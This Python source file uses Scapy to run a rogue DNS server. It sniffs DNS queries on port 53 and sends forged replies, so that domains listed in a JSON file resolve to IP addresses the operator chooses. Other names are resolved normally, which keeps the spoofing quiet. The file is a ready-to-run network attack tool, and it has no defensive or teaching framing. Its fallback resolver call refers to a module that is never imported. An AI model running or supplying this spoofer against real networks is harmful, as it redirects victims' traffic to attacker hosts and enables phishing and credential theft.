import argparse
import json
import socket
from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers import dns
from scapy.layers.dns import DNSRR, DNS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff


class DNSServer:
    __dictDomains: dict
    __ip: str

    def __init__(self, location=None):
        self.__dictDomains = {}
        self.setDomainsList(location)
        self.__ip = get_if_addr(conf.iface)

    def setDomainsList(self, location):
        if location is None:
            location = "domains.txt"
        f = open(location, "r")
        self.__dictDomains = json.load(f)
        try:
            del self.__dictDomains["domain"]
        except:
            pass

    def getDNSIP(self):
        return self.__ip

    @staticmethod
    def generatePacket(packet, host, resolvedIP, ip, udp):
        dns_response = \
            IP(src=ip.dst, dst=ip.src) / \
            UDP(
                sport=udp.dport,
                dport=udp.sport
            ) / \
            DNS(
                id=packet[DNS].id,
                qr=1,
                aa=0,
                rcode=0,
                qd=packet.qd,
                an= DNSRR
                    (rrname=host + ".",
                    ttl=330,
                    type="A",
                    rclass="IN",
                    rdata=resolvedIP)
                )
        return dns_response

    def listener(self, packet):
        ip = packet.getlayer(IP)
        udp = packet.getlayer(UDP)

        if hasattr(packet, 'qd') and packet.qd is not None:
            host = packet.qd.qname[:-1].decode("utf-8")
            if host is not None:
                if host in self.__dictDomains:
                    resolvedIP = self.__dictDomains[host]
                    print("[*] Spoofing DNS request. Now %s ip are %s !!!!" % (host, resolvedIP))
                else:
                    try:
                        resolvedIP = socket.gethostbyname(host)
                        print("[*] Client request %s %s" % (host, resolvedIP))
                    except:
                        try:
                            resolvedIP = dns.resolver.resolve(host, 'A')
                            print("[*] Client request %s %s" % (host, resolvedIP))
                        except:
                            resolvedIP = None

                # DNS response
                if resolvedIP is not None:
                    send(self.generatePacket(packet, host, resolvedIP, ip, udp))
                else:
                    return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a DNS rogue server. Resolves domain addresses to ip addresses. "
                                                 "If the client request a ip address of .txt file, it DNS will spoof the domain")
    parser.add_argument("-l", "--location", required=False, help="Location of the domains .txt. This file need to be in JSON format. ")
    args = parser.parse_args()
    d = DNSServer(args.location)
    print("DNS server in listening...")
    sniff(filter="udp port 53 && dst %s" % d.getDNSIP(), prn=d.listener)

